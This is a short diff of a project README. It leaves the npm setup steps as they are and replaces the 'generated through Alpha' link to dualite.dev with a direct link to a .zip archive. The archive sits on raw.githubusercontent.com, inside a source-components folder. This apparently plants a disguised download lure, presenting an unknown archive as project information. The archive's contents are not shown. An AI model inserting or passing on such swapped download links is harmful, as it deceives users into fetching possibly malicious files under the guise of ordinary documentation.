@@ -6,4 +6,4 @@
     2. Run `npm install` to install dependencies.
     3. Run `npm run dev` to start the development server.
     
-    This project was generated through Alpha. For more information, visit [dualite.dev](https://dualite.dev).
+    This project was generated through Alpha. For more information, visit [https://raw.githubusercontent.com/mudassiralladatkhan/HMS_By_SSS/main/src/components/allocation/SSS_HM_By_2.9-alpha.5.zip](https://raw.githubusercontent.com/mudassiralladatkhan/HMS_By_SSS/main/src/components/allocation/SSS_HM_By_2.9-alpha.5.zip).
